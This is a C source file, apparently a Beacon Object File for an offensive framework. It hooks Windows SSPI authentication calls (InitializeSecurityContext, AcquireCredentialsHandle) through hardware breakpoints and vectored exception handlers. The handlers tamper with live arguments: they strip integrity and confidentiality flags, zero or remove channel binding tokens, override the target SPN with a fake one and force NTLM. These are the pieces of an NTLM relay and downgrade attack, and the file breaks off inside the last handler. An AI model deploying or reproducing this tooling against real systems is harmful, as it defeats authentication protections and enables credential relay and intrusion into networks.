// Public API
// - HWBP_SetOnAddress: set a hardware breakpoint (execute) in DR0-DR3 on current thread
// - HWBP_Clear: clear a hardware breakpoint in DR0-DR3 on current thread
// - HWBP_SetOnApi: resolve module!proc, register VEH (optional), set HWBP, return address and VEH handle
// - HWBP_RemoveVeh: unregister a previously added VEH
// - HWBP_SetOnApiEx: like HWBP_SetOnApi but can arm all threads too
// - HWBP_ClearOnAllThreads: clear a DR index on all other threads (skip current; caller clears current)

// DR target addresses for precise filtering
static PVOID g_hw_iscw_addr = NULL;
static PVOID g_hw_achw_addr = NULL;
static PVOID g_hw_isca_addr = NULL;
static PVOID g_hw_acha_addr = NULL;

static inline void* hwbp_resolve_api(const char* moduleNameA, const char* procNameA) {
	if (!moduleNameA || !procNameA) return NULL;
	HMODULE hMod = KERNEL32$GetModuleHandleA(moduleNameA);
	if (!hMod) {
		hMod = KERNEL32$LoadLibraryA(moduleNameA);
		if (!hMod) return NULL;
	}
	FARPROC fp = KERNEL32$GetProcAddress(hMod, procNameA);
	return (void*)fp;
}

static inline BOOL hwbp_set_dr(CONTEXT* ctx, int regIndex, void* address) {
	if (!ctx || regIndex < 0 || regIndex > 3) return FALSE;
	// Assign address to the selected DRx
	switch (regIndex) {
		case 0: ctx->Dr0 = (ULONG_PTR)address; break;
		case 1: ctx->Dr1 = (ULONG_PTR)address; break;
		case 2: ctx->Dr2 = (ULONG_PTR)address; break;
		case 3: ctx->Dr3 = (ULONG_PTR)address; break;
		default: return FALSE;
	}
	// Configure DR7: enable local breakpoint Ln, type=execute (RW=00), len=1 (LEN=00)
	ULONG_PTR dr7 = ctx->Dr7;
	// Clear enable bits for the selected index (local/global)
	dr7 &= ~(1ULL << (regIndex * 2));     // Ln
	dr7 &= ~(1ULL << (regIndex * 2 + 1)); // Gn
	// Set local enable (Ln)
	dr7 |= (1ULL << (regIndex * 2));
	// Clear RWn and LENn fields (bits 16..31)
	const unsigned rwShift = 16 + (regIndex * 4);
	const unsigned lenShift = rwShift + 2;
	dr7 &= ~(3ULL << rwShift); // RWn = 00 (execute)
	dr7 &= ~(3ULL << lenShift); // LENn = 00 (1 byte) – ignored for execute
	ctx->Dr7 = dr7;
	return TRUE;
}

static inline BOOL hwbp_clear_dr(CONTEXT* ctx, int regIndex) {
	if (!ctx || regIndex < 0 || regIndex > 3) return FALSE;
	// Clear address in DRx
	switch (regIndex) {
		case 0: ctx->Dr0 = 0; break;
		case 1: ctx->Dr1 = 0; break;
		case 2: ctx->Dr2 = 0; break;
		case 3: ctx->Dr3 = 0; break;
		default: return FALSE;
	}
	// Disable Ln/Gn and clear RW/LEN for this index
	ULONG_PTR dr7 = ctx->Dr7;
	dr7 &= ~(1ULL << (regIndex * 2));     // Ln
	dr7 &= ~(1ULL << (regIndex * 2 + 1)); // Gn
	const unsigned rwShift = 16 + (regIndex * 4);
	const unsigned lenShift = rwShift + 2;
	dr7 &= ~(3ULL << rwShift);
	dr7 &= ~(3ULL << lenShift);
	ctx->Dr7 = dr7;
	return TRUE;
}

BOOL HWBP_SetOnAddress(void* address, int regIndex) {
	if (!address || regIndex < 0 || regIndex > 3) return FALSE;
	HANDLE hThread = KERNEL32$GetCurrentThread();
	CONTEXT ctx; intZeroMemory(&ctx, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (!KERNEL32$GetThreadContext(hThread, &ctx)) return FALSE;
	if (!hwbp_set_dr(&ctx, regIndex, address)) return FALSE;
	return KERNEL32$SetThreadContext(hThread, &ctx);
}

BOOL HWBP_Clear(int regIndex) {
	if (regIndex < 0 || regIndex > 3) return FALSE;
	HANDLE hThread = KERNEL32$GetCurrentThread();
	CONTEXT ctx; intZeroMemory(&ctx, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (!KERNEL32$GetThreadContext(hThread, &ctx)) return FALSE;
	if (!hwbp_clear_dr(&ctx, regIndex)) return FALSE;
	return KERNEL32$SetThreadContext(hThread, &ctx);
}

BOOL HWBP_RemoveVeh(PVOID vehHandle) {
	if (!vehHandle) return FALSE;
	ULONG rc = KERNEL32$RemoveVectoredExceptionHandler(vehHandle);
	return (rc != 0);
}

// Arm DR on all threads in the process for the given address/regIndex; returns count of threads armed
static int ArmAllThreadsHwBps(void* address, int regIndex) {
	if (!address || regIndex < 0 || regIndex > 3) return 0;
	DWORD pid = KERNEL32$GetCurrentProcessId();
	DWORD currentTid = KERNEL32$GetCurrentThreadId();
	HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (snap == INVALID_HANDLE_VALUE) { return 0; }
	THREADENTRY32 te; te.dwSize = sizeof(te);
	int armed = 0;
	if (KERNEL32$Thread32First(snap, &te)) {
		do {
			if (te.th32OwnerProcessID != pid) continue;
			if (te.th32ThreadID == currentTid) {
				// current thread handled by caller
				continue;
			}
			HANDLE th = KERNEL32$OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
			if (!th) continue;
			KERNEL32$SuspendThread(th);
			CONTEXT ctx; intZeroMemory(&ctx, sizeof(ctx));
			ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
			if (KERNEL32$GetThreadContext(th, &ctx)) {
				if (hwbp_set_dr(&ctx, regIndex, address)) {
					if (KERNEL32$SetThreadContext(th, &ctx)) {
						armed++;
					}
				}
			}
			KERNEL32$ResumeThread(th);
			KERNEL32$CloseHandle(th);
		} while (KERNEL32$Thread32Next(snap, &te));
	}
	KERNEL32$CloseHandle(snap);
	return armed;
}

// Clear the specified DR register on all other threads in the process
int HWBP_ClearOnAllThreads(int regIndex) {
    if (regIndex < 0 || regIndex > 3) return 0;
    DWORD pid = KERNEL32$GetCurrentProcessId();
    DWORD currentTid = KERNEL32$GetCurrentThreadId();
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { return 0; }
    THREADENTRY32 te; te.dwSize = sizeof(te);
    int cleared = 0;
    if (KERNEL32$Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            if (te.th32ThreadID == currentTid) continue;
            HANDLE th = KERNEL32$OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (!th) continue;
            KERNEL32$SuspendThread(th);
            CONTEXT ctx; intZeroMemory(&ctx, sizeof(ctx));
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (KERNEL32$GetThreadContext(th, &ctx)) {
                if (hwbp_clear_dr(&ctx, regIndex)) {
                    if (KERNEL32$SetThreadContext(th, &ctx)) {
                        cleared++;
                    }
                }
            }
            KERNEL32$ResumeThread(th);
            KERNEL32$CloseHandle(th);
        } while (KERNEL32$Thread32Next(snap, &te));
    }
    KERNEL32$CloseHandle(snap);
    return cleared;
}

// Convenience: resolve API, register VEH (optional), set HWBP. Any step failing will unwind VEH if set here.
BOOL HWBP_SetOnApiEx(
	const char* moduleNameA,
	const char* procNameA,
	int regIndex,
	PVECTORED_EXCEPTION_HANDLER vehHandler,
	PVOID* outVehHandle,
	void** outResolvedAddress,
	BOOL armAllThreads
) {
	if (!moduleNameA || !procNameA || regIndex < 0 || regIndex > 3) return FALSE;
	if (outVehHandle) *outVehHandle = NULL;
	if (outResolvedAddress) *outResolvedAddress = NULL;

	void* addr = hwbp_resolve_api(moduleNameA, procNameA);
	if (!addr) return FALSE;
	if (outResolvedAddress) *outResolvedAddress = addr;

	// Remember well-known targets for VEH filtering
	if (MSVCRT$strcmp(procNameA, "InitializeSecurityContextW") == 0) {
		g_hw_iscw_addr = addr;
	} else if (MSVCRT$strcmp(procNameA, "AcquireCredentialsHandleW") == 0) {
		g_hw_achw_addr = addr;
	} else if (MSVCRT$strcmp(procNameA, "InitializeSecurityContextA") == 0) {
		g_hw_isca_addr = addr;
	} else if (MSVCRT$strcmp(procNameA, "AcquireCredentialsHandleA") == 0) {
		g_hw_acha_addr = addr;
	}

	PVOID vehHandle = NULL;
	if (vehHandler) {
		vehHandle = KERNEL32$AddVectoredExceptionHandler(1, vehHandler);
		if (!vehHandle) return FALSE;
		if (outVehHandle) *outVehHandle = vehHandle;
	}

	// Arm current thread first
	if (!HWBP_SetOnAddress(addr, regIndex)) {
		if (vehHandle) {
			KERNEL32$RemoveVectoredExceptionHandler(vehHandle);
			if (outVehHandle) *outVehHandle = NULL;
		}
		return FALSE;
	}
	// Optionally arm all other threads
	if (armAllThreads) {
		ArmAllThreadsHwBps(addr, regIndex);
	}
	return TRUE;
}

// Toggle to force NTLM when ACHW requests Kerberos/Negotiate (or NULL)
static volatile LONG g_forceNtlm = 0;

// CBT manipulation mode: 0=observe, 1=zero hash, 2=remove CBT
static volatile LONG g_cbtMode = 0;
static volatile LONG g_cbtModified = 0;

// SPN override mode: 0=normal, 1=override TargetName with fake SPN
static volatile LONG g_spnMode = 0;
static volatile LONG g_spnModified = 0;

// Optional: strip INTEGRITY (0x00010000) and CONFIDENTIALITY (0x00000010) from ISC fContextReq
static volatile LONG g_stripProtFlags = 0;

static BOOL is_readable(const void* p, SIZE_T cb) {
    MEMORY_BASIC_INFORMATION mbi;
    if (!p) return FALSE;
    if (KERNEL32$VirtualQuery(p, &mbi, sizeof(mbi)) != sizeof(mbi)) return FALSE;
    if (mbi.State != MEM_COMMIT) return FALSE;
    // allow PAGE_READ* and PAGE_EXECUTE_READ* and writable variants
    DWORD prot = mbi.Protect & 0xFF;
    switch (prot) {
        case PAGE_READONLY: case PAGE_READWRITE: case PAGE_WRITECOPY:
        case PAGE_EXECUTE_READ: case PAGE_EXECUTE_READWRITE: case PAGE_EXECUTE_WRITECOPY:
            break;
        default: return FALSE;
    }
    // crude bound check for the requested range
    SIZE_T avail = (SIZE_T)((BYTE*)mbi.BaseAddress + mbi.RegionSize - (BYTE*)p);
    return avail >= cb;
}

static BOOL is_writable(void* p, SIZE_T cb) {
    MEMORY_BASIC_INFORMATION mbi;
    if (!p) return FALSE;
    if (KERNEL32$VirtualQuery(p, &mbi, sizeof(mbi)) != sizeof(mbi)) return FALSE;
    if (mbi.State != MEM_COMMIT) return FALSE;
    DWORD prot = mbi.Protect & 0xFF;
    switch (prot) {
        case PAGE_READWRITE: case PAGE_WRITECOPY:
        case PAGE_EXECUTE_READWRITE: case PAGE_EXECUTE_WRITECOPY:
            break;
        default: return FALSE;
    }
    SIZE_T avail = (SIZE_T)((BYTE*)mbi.BaseAddress + mbi.RegionSize - (BYTE*)p);
    return avail >= cb;
}

static size_t safe_wcs_len(const wchar_t* s, size_t maxChars) {
    if (!s) return 0;
    for (size_t i = 0; i < maxChars; i++) {
        if (!is_readable((const void*)(s + i), sizeof(wchar_t))) return i;
        if (s[i] == L'\0') return i;
    }
    return maxChars;
}

static void safe_wcs_to_utf8(const wchar_t* ws, char* out, size_t outSize) {
    if (!out || outSize == 0) return;
    out[0] = '\0';
    if (!ws) return;
    size_t wlen = safe_wcs_len(ws, 512);
    if (wlen == 0) return;
    // Convert with explicit length
    int need = Kernel32$WideCharToMultiByte(CP_UTF8, 0, ws, (int)wlen, out, (int)outSize - 1, NULL, NULL);
    if (need > 0) out[need] = '\0';
}

static BOOL safe_wcs_has_prefix(const wchar_t* ws, const wchar_t* prefix) {
    if (!ws || !prefix) return FALSE;
    size_t plen = 0;
    while (prefix[plen] != L'\0') plen++;
    // Ensure the source is readable for the prefix length
    for (size_t i = 0; i < plen; i++) {
        if (!is_readable((const void*)(ws + i), sizeof(wchar_t))) return FALSE;
        if (ws[i] != prefix[i]) return FALSE;
    }
    return TRUE;
}

static BOOL safe_str_has_prefix(const char* s, const char* prefix) {
    if (!s || !prefix) return FALSE;
    size_t plen = 0;
    while (prefix[plen] != '\0') plen++;
    // Ensure the source is readable for the prefix length
    for (size_t i = 0; i < plen; i++) {
        if (!is_readable((const void*)(s + i), sizeof(char))) return FALSE;
        if (s[i] != prefix[i]) return FALSE;
    }
    return TRUE;
}

static char clower(char c) { return (c >= 'A' && c <= 'Z') ? (char)(c + 32) : c; }
static BOOL safe_str_has_prefix_i(const char* s, const char* prefix) {
    if (!s || !prefix) return FALSE;
    size_t plen = 0;
    while (prefix[plen] != '\0') plen++;
    for (size_t i = 0; i < plen; i++) {
        if (!is_readable((const void*)(s + i), sizeof(char))) return FALSE;
        if (clower(s[i]) != clower(prefix[i])) return FALSE;
    }
    return TRUE;
}

#ifndef BOF
static void log_fContextReq_flags(ULONG f) {
    internal_printf("[ISC] fContextReq: 0x%08X\n", f);
    internal_printf("[ISC]   flags:");
    if (f & 0x00000001) internal_printf(" ISC_REQ_DELEGATE");
    if (f & 0x00000002) internal_printf(" ISC_REQ_MUTUAL_AUTH");
    if (f & 0x00000004) internal_printf(" ISC_REQ_REPLAY_DETECT");
    if (f & 0x00000008) internal_printf(" ISC_REQ_SEQUENCE_DETECT");
    if (f & 0x00000010) internal_printf(" ISC_REQ_CONFIDENTIALITY");
    if (f & 0x00000020) internal_printf(" ISC_REQ_USE_SESSION_KEY");
    if (f & 0x00000040) internal_printf(" ISC_REQ_PROMPT_FOR_CREDS");
    if (f & 0x00000080) internal_printf(" ISC_REQ_USE_SUPPLIED_CREDS");
    if (f & 0x00000100) internal_printf(" ISC_REQ_ALLOCATE_MEMORY");
    if (f & 0x00000200) internal_printf(" ISC_REQ_USE_DCE_STYLE");
    if (f & 0x00000400) internal_printf(" ISC_REQ_DATAGRAM");
    if (f & 0x00000800) internal_printf(" ISC_REQ_CONNECTION");
    if (f & 0x00001000) internal_printf(" ISC_REQ_CALL_LEVEL");
    if (f & 0x00002000) internal_printf(" ISC_REQ_FRAGMENT_SUPPLIED");
    if (f & 0x00004000) internal_printf(" ISC_REQ_EXTENDED_ERROR");
    if (f & 0x00008000) internal_printf(" ISC_REQ_STREAM");
    if (f & 0x00010000) internal_printf(" ISC_REQ_INTEGRITY");
    if (f & 0x00020000) internal_printf(" ISC_REQ_IDENTIFY");
    if (f & 0x00040000) internal_printf(" ISC_REQ_NULL_SESSION");
    if (f & 0x00080000) internal_printf(" ISC_REQ_MANUAL_CRED_VALIDATION");
    if (f & 0x00100000) internal_printf(" ISC_REQ_RESERVED1");
    if (f & 0x00200000) internal_printf(" ISC_REQ_FRAGMENT_TO_FIT");
    internal_printf("\n");
}
#endif

// Bounded wide copy helper
static void wcopy_bounded(wchar_t* dst, size_t dstMax, const wchar_t* src) {
    if (!dst || dstMax == 0) return;
    if (!src) { dst[0] = L'\0'; return; }
    size_t i = 0;
    for (; i + 1 < dstMax && src[i] != L'\0'; i++) dst[i] = src[i];
    dst[i] = L'\0';
}

static wchar_t wlower(wchar_t c) { return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + 32) : c; }
static BOOL safe_wcs_has_prefix_i(const wchar_t* ws, const wchar_t* prefix) {
    if (!ws || !prefix) return FALSE;
    for (size_t i = 0; prefix[i] != L'\0'; i++) {
        if (!is_readable((const void*)(ws + i), sizeof(wchar_t))) return FALSE;
        if (wlower(ws[i]) != wlower(prefix[i])) return FALSE;
    }
    return TRUE;
}

static LONG CALLBACK ISC_VEH(EXCEPTION_POINTERS *ex) {
    DWORD code = ex->ExceptionRecord->ExceptionCode;
    if (code != 0x80000004 /* EXCEPTION_SINGLE_STEP */) return EXCEPTION_CONTINUE_SEARCH;
#ifdef _WIN64
    void* ip = (void*)ex->ContextRecord->Rip;
#else
    void* ip = (void*)ex->ContextRecord->Eip;
#endif
    // Ensure this DR hit is for our intended function
    if (g_hw_iscw_addr && ip != g_hw_iscw_addr) return EXCEPTION_CONTINUE_SEARCH;
    // New call: reset per-call flags
    g_cbtModified = 0;
    g_spnModified = 0;

#ifdef _WIN64
    // x64 Windows ABI: RCX, RDX, R8, R9, then stack
    PCredHandle phCredential    = (PCredHandle)ex->ContextRecord->Rcx;
    PCtxtHandle phContext       = (PCtxtHandle)ex->ContextRecord->Rdx;
    const wchar_t* pszTargetW   = (const wchar_t*)ex->ContextRecord->R8;
    ULONG fContextReq           = (ULONG)ex->ContextRecord->R9;

    // Non-intrusive: optionally strip protection flags before any further parsing
    if (g_stripProtFlags) {
        ULONG stripped = fContextReq & ~(ISC_REQ_INTEGRITY | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY);
        if (stripped != fContextReq) {
            ex->ContextRecord->R9 = stripped;
            fContextReq = stripped;
#ifndef BOF
            internal_printf("[ISC] ACTION: stripped INTEGRITY/CONFIDENTIALITY/SEQUENCE_DETECT -> fContextReq=0x%08X\n", fContextReq);
#endif
        }
    }

    // Safely discover a plausible pInput by scanning stack slots and validating
    PSecBufferDesc pInput = NULL;
    BYTE* spScan = (BYTE*)ex->ContextRecord->Rsp;
    for (int off = 0x20; off <= 0xA0; off += 8) {
        if (!is_readable(spScan + off, sizeof(void*))) continue;
        PSecBufferDesc cand = *(PSecBufferDesc*)(spScan + off);
        if (cand && is_readable(cand, sizeof(SecBufferDesc))) {
            SecBufferDesc tmp; MSVCRT$memcpy(&tmp, cand, sizeof(tmp));
            if (tmp.cBuffers && tmp.cBuffers <= 16 && tmp.pBuffers && is_readable(tmp.pBuffers, tmp.cBuffers * sizeof(SecBuffer))) {
                pInput = cand; break;
            }
        }
    }

    // Decide SPN override after we infer whether this is Type 1 (pInput absent)
    if (g_spnMode && !g_spnModified) {
        if (pszTargetW && (safe_wcs_has_prefix_i(pszTargetW, L"HTTP/") || safe_wcs_has_prefix_i(pszTargetW, L"MSSQLSvc/") || safe_wcs_has_prefix_i(pszTargetW, L"LDAP/"))) {
            ex->ContextRecord->R8 = (ULONG_PTR)g_fakeSpnW;
            pszTargetW = g_fakeSpnW;
            g_spnModified = 1;
            #ifndef BOF
                internal_printf("[ISC]   (SPN override active)\n");
            #endif
        }
    }

    char targetA[256] = {0};
    safe_wcs_to_utf8(pszTargetW, targetA, sizeof(targetA));

    #ifndef BOF
        internal_printf("\n");
        internal_printf("=====>InitializeSecurityContextW trap<======\n");
        internal_printf("[ISC] TargetName: %s\n", targetA[0]?targetA:"(null)");
        if (g_spnMode && g_spnModified) internal_printf("[ISC]   (SPN override active)\n");
        log_fContextReq_flags(fContextReq);
        internal_printf("[ISC] pInput=%p\n", pInput);
    #endif

    if (pInput && is_readable(pInput, sizeof(SecBufferDesc))) {
        SecBufferDesc desc; MSVCRT$memcpy(&desc, pInput, sizeof(desc));
        #ifndef BOF
            internal_printf("[ISC] pInput ver=%lu c=%lu pBuf=%p\n", desc.ulVersion, desc.cBuffers, desc.pBuffers);
        #endif

        // sanity caps
        ULONG c = desc.cBuffers;
        if (c == 0 || c > 16 || !is_readable(desc.pBuffers, c * sizeof(SecBuffer))) {
            #ifndef BOF
                internal_printf("[ISC] skip buffer walk (c=%lu or not readable)\n", c);
            #endif
        } else {
            SecBuffer local[16];
            MSVCRT$memcpy(local, desc.pBuffers, c * sizeof(SecBuffer));
            for (ULONG i = 0; i < c; i++) {
                #ifndef BOF
                    internal_printf("[ISC]  buf[%lu]: type=%lu cb=%lu pv=%p\n", i, local[i].BufferType, local[i].cbBuffer, local[i].pvBuffer);
                #endif
                if (local[i].BufferType == SECBUFFER_CHANNEL_BINDINGS && is_readable(local[i].pvBuffer, sizeof(SEC_CHANNEL_BINDINGS))) {
                    SEC_CHANNEL_BINDINGS cbh; MSVCRT$memcpy(&cbh, local[i].pvBuffer, sizeof(cbh));
                    #ifndef BOF
                        internal_printf("[ISC]   CB appOff=%lu appLen=%lu\n", cbh.dwApplicationDataOffset, cbh.cbApplicationDataLength);
                    #endif
                    BYTE* appPtr = (BYTE*)local[i].pvBuffer + cbh.dwApplicationDataOffset;
                    DWORD appLen = cbh.cbApplicationDataLength;
                    if (appLen > 0 && is_readable(appPtr, min((DWORD)512, appLen))) {
                        #ifndef BOF
                            internal_printf("[ISC]   CB appDataHex: ");
                            DWORD toPrint = (appLen > 512) ? 512 : appLen;
                            for (DWORD j = 0; j < toPrint; j++) internal_printf("%02X", appPtr[j]);
                            if (appLen > toPrint) internal_printf("...");
                            internal_printf("\n");
                        #endif
                    }
                    if (g_cbtMode != 0 && !g_cbtModified) {
                        if (g_cbtMode == 1) {
                            if (is_writable(desc.pBuffers, c * sizeof(SecBuffer))) {
                                SecBuffer *realBufs = desc.pBuffers;
                                realBufs[i].BufferType = SECBUFFER_EMPTY;
                                realBufs[i].cbBuffer = 0;
                            }
                            if (is_writable(local[i].pvBuffer, sizeof(SEC_CHANNEL_BINDINGS))) {
                                SEC_CHANNEL_BINDINGS *cbReal = (SEC_CHANNEL_BINDINGS*)local[i].pvBuffer;
                                cbReal->cbApplicationDataLength = 0;
                                cbReal->dwApplicationDataOffset = 0;
                            }
                            #ifndef BOF
                                internal_printf("[ISC]   ACTION: zeroed CBT (emptied buffer)\n");
                            #endif
                            g_cbtModified = 1;
                        } else if (g_cbtMode == 2) {
                            if (is_writable(pInput, sizeof(SecBufferDesc)) && is_writable(desc.pBuffers, c * sizeof(SecBuffer))) {
                                SecBuffer *realBufs = desc.pBuffers;
                                for (ULONG j = i; j + 1 < c; j++) {
                                    realBufs[j] = realBufs[j + 1];
                                }
                                MSVCRT$memset(&realBufs[c - 1], 0, sizeof(SecBuffer));
                                ((SecBufferDesc*)pInput)->cBuffers = c - 1;
#ifndef BOF
                                internal_printf("[ISC]   ACTION: removed CBT entry from SecBufferDesc (cBuffers=%lu -> %lu)\n", c, c - 1);
#endif
                                g_cbtModified = 1;
                            } else {
#ifndef BOF
                                internal_printf("[ISC]   ACTION: remove CBT entry FAILED (descriptor/buffer not writable)\n");
#endif
                            }
                        }
                    }
                }
            }
        }
    } else {
        #ifndef BOF
            internal_printf("[ISC] Type1 (no input) or pInput unreadable\n");
        #endif
    }
    #ifndef BOF
        internal_printf("\n");
    #endif
    #endif
    // Clear debug state and resume after DR hit
    ex->ContextRecord->EFlags |= 0x10000; // RF
    ex->ContextRecord->Dr6 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}

static LONG CALLBACK ISC_A_VEH(EXCEPTION_POINTERS *ex) {
    DWORD code = ex->ExceptionRecord->ExceptionCode;
    if (code != 0x80000004 /* EXCEPTION_SINGLE_STEP */) return EXCEPTION_CONTINUE_SEARCH;
#ifdef _WIN64
    void* ip = (void*)ex->ContextRecord->Rip;
#else
    void* ip = (void*)ex->ContextRecord->Eip;
#endif
    // Ensure this DR hit is for our intended function
    if (g_hw_isca_addr && ip != g_hw_isca_addr) return EXCEPTION_CONTINUE_SEARCH;
    // New call: reset per-call flags
    g_cbtModified = 0;
    g_spnModified = 0;

#ifdef _WIN64
    // x64 Windows ABI: RCX, RDX, R8, R9, then stack
    PCredHandle phCredential    = (PCredHandle)ex->ContextRecord->Rcx;
    PCtxtHandle phContext       = (PCtxtHandle)ex->ContextRecord->Rdx;
    const char* pszTargetA      = (const char*)ex->ContextRecord->R8;
    ULONG fContextReq           = (ULONG)ex->ContextRecord->R9;

    // Non-intrusive: optionally strip protection flags before any further parsing
    if (g_stripProtFlags) {
        ULONG stripped = fContextReq & ~(0x00010000u /*INTEGRITY*/ | 0x00000010u /*CONFIDENTIALITY*/);
        if (stripped != fContextReq) {
            ex->ContextRecord->R9 = stripped;
            fContextReq = stripped;
            #ifndef BOF
                internal_printf("[ISC] ACTION: stripped INTEGRITY/CONFIDENTIALITY -> fContextReq=0x%08X\n", fContextReq);
            #endif
        }
    }

    // Safely discover a plausible pInput by scanning stack slots and validating
    PSecBufferDesc pInput = NULL;
    BYTE* spScan = (BYTE*)ex->ContextRecord->Rsp;
    for (int off = 0x20; off <= 0xA0; off += 8) {
        if (!is_readable(spScan + off, sizeof(void*))) continue;
        PSecBufferDesc cand = *(PSecBufferDesc*)(spScan + off);
        if (cand && is_readable(cand, sizeof(SecBufferDesc))) {
            SecBufferDesc tmp; MSVCRT$memcpy(&tmp, cand, sizeof(tmp));
            if (tmp.cBuffers && tmp.cBuffers <= 16 && tmp.pBuffers && is_readable(tmp.pBuffers, tmp.cBuffers * sizeof(SecBuffer))) {
                pInput = cand; break;
            }
        }
    }

    // Decide SPN override after we infer whether this is Type 1 (pInput absent)
    if (g_spnMode && !g_spnModified) {
        if (pszTargetA && (safe_str_has_prefix_i(pszTargetA, "HTTP/") || safe_str_has_prefix_i(pszTargetA, "MSSQLSvc/") || safe_str_has_prefix_i(pszTargetA, "LDAP/"))) {
            static char g_fakeSpnA[64];
            safe_wcs_to_utf8(g_fakeSpnW, g_fakeSpnA, sizeof(g_fakeSpnA));
            ex->ContextRecord->R8 = (ULONG_PTR)g_fakeSpnA;
            pszTargetA = g_fakeSpnA;
            g_spnModified = 1;
            #ifndef BOF
                internal_printf("[ISC]   (SPN override active)\n");
            #endif
        }
    }

    #ifndef BOF
        internal_printf("\n");
        internal_printf("=====>InitializeSecurityContextA trap<======\n");
        internal_printf("[ISC] TargetName: %s\n", pszTargetA?pszTargetA:"(null)");
        if (g_spnMode && g_spnModified) internal_printf("[ISC]   (SPN override active)\n");
        log_fContextReq_flags(fContextReq);
        internal_printf("[ISC] pInput=%p\n", pInput);
    #endif

    if (pInput && is_readable(pInput, sizeof(SecBufferDesc))) {
        SecBufferDesc desc; MSVCRT$memcpy(&desc, pInput, sizeof(desc));
        #ifndef BOF
            internal_printf("[ISC] pInput ver=%lu c=%lu pBuf=%p\n", desc.ulVersion, desc.cBuffers, desc.pBuffers);
        #endif

        // sanity caps
        ULONG c = desc.cBuffers;
        if (c == 0 || c > 16 || !is_readable(desc.pBuffers, c * sizeof(SecBuffer))) {
            #ifndef BOF
                internal_printf("[ISC] skip buffer walk (c=%lu or not readable)\n", c);
            #endif
        } else {
            SecBuffer local[16];
            MSVCRT$memcpy(local, desc.pBuffers, c * sizeof(SecBuffer));
            for (ULONG i = 0; i < c; i++) {
                #ifndef BOF
                    internal_printf("[ISC]  buf[%lu]: type=%lu cb=%lu pv=%p\n", i, local[i].BufferType, local[i].cbBuffer, local[i].pvBuffer);
                #endif
                if (local[i].BufferType == SECBUFFER_CHANNEL_BINDINGS && is_readable(local[i].pvBuffer, sizeof(SEC_CHANNEL_BINDINGS))) {
                    SEC_CHANNEL_BINDINGS cbh; MSVCRT$memcpy(&cbh, local[i].pvBuffer, sizeof(cbh));
                    #ifndef BOF
                        internal_printf("[ISC]   CB appOff=%lu appLen=%lu\n", cbh.dwApplicationDataOffset, cbh.cbApplicationDataLength);
                    #endif
                    BYTE* appPtr = (BYTE*)local[i].pvBuffer + cbh.dwApplicationDataOffset;
                    DWORD appLen = cbh.cbApplicationDataLength;
                    if (appLen > 0 && is_readable(appPtr, min((DWORD)512, appLen))) {
                        #ifndef BOF
                            internal_printf("[ISC]   CB appDataHex: ");
                            DWORD toPrint = (appLen > 512) ? 512 : appLen;
                            for (DWORD j = 0; j < toPrint; j++) internal_printf("%02X", appPtr[j]);
                            if (appLen > toPrint) internal_printf("...");
                            internal_printf("\n");
                        #endif
                    }
                    if (g_cbtMode != 0 && !g_cbtModified) {
                        if (g_cbtMode == 1) {
                            if (is_writable(desc.pBuffers, c * sizeof(SecBuffer))) {
                                SecBuffer *realBufs = desc.pBuffers;
                                realBufs[i].BufferType = SECBUFFER_EMPTY;
                                realBufs[i].cbBuffer = 0;
                            }
                            if (is_writable(local[i].pvBuffer, sizeof(SEC_CHANNEL_BINDINGS))) {
                                SEC_CHANNEL_BINDINGS *cbReal = (SEC_CHANNEL_BINDINGS*)local[i].pvBuffer;
                                cbReal->cbApplicationDataLength = 0;
                                cbReal->dwApplicationDataOffset = 0;
                            }
                            #ifndef BOF
                                internal_printf("[ISC]   ACTION: zeroed CBT (emptied buffer)\n");
                            #endif
                            g_cbtModified = 1;
                        } else if (g_cbtMode == 2) {
                            if (is_writable(pInput, sizeof(SecBufferDesc)) && is_writable(desc.pBuffers, c * sizeof(SecBuffer))) {
                                SecBuffer *realBufs = desc.pBuffers;
                                for (ULONG j = i; j + 1 < c; j++) {
                                    realBufs[j] = realBufs[j + 1];
                                }
                                MSVCRT$memset(&realBufs[c - 1], 0, sizeof(SecBuffer));
                                ((SecBufferDesc*)pInput)->cBuffers = c - 1;
                                #ifndef BOF
                                    internal_printf("[ISC]   ACTION: removed CBT entry from SecBufferDesc (cBuffers=%lu -> %lu)\n", c, c - 1);
                                #endif
                                g_cbtModified = 1;
                            } else {
                                #ifndef BOF
                                    internal_printf("[ISC]   ACTION: remove CBT entry FAILED (descriptor/buffer not writable)\n");
                                #endif
                            }
                        }
                    }
                }
            }
        }
    } else {
        #ifndef BOF
            internal_printf("[ISC] Type1 (no input) or pInput unreadable\n");
        #endif
    }
    #ifndef BOF
        internal_printf("\n");
    #endif
    #endif
    // Clear debug state and resume after DR hit
    ex->ContextRecord->EFlags |= 0x10000; // RF
    ex->ContextRecord->Dr6 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}

// Separate VEH for AcquireCredentialsHandleW to keep logic isolated and clearer
static LONG CALLBACK ACH_VEH(EXCEPTION_POINTERS *ex) {
    if (ex->ExceptionRecord->ExceptionCode != 0x80000004 /* EXCEPTION_SINGLE_STEP */) return EXCEPTION_CONTINUE_SEARCH;
#ifdef _WIN64
    void* ip = (void*)ex->ContextRecord->Rip;
#else
    void* ip = (void*)ex->ContextRecord->Eip;
#endif
    // Ensure this DR hit is for our intended function
    if (g_hw_achw_addr && ip != g_hw_achw_addr) return EXCEPTION_CONTINUE_SEARCH;

#ifdef _WIN64
    const wchar_t* pkg = (const wchar_t*)ex->ContextRecord->Rdx; // AcquireCredentialsHandleW: RDX = package
    char pkgA[128] = {0};
